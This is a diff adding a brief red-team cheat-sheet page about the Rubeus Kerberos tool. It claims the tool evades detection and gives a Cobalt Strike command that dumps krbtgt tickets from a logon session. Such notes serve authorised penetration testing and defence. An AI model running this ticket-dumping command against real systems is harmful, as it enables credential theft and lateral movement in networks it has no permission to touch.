@@ -1,0 +1,14 @@
+---
+layout:     post
+author:     0x5c4r3
+type: docs
+permalink: Rubeus
+---
+
+
+<span style="font-size: 35px; color:red"><b>Rubeus</b></span>
+&nbsp;
+Rubeus is SNEAKY and will not get detected as it uses proper Windows APIs.
+Quick Reference CobaltStrike:
+- <span style="color:red">triage</span>: To see all kerberos tickets in current session.
+- <span style="color:red">dump</span>: to extract tickets from current session (i.e. <span style="color:red">execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /nowrap /luid:0x7049f /service:krbtgt</span>).
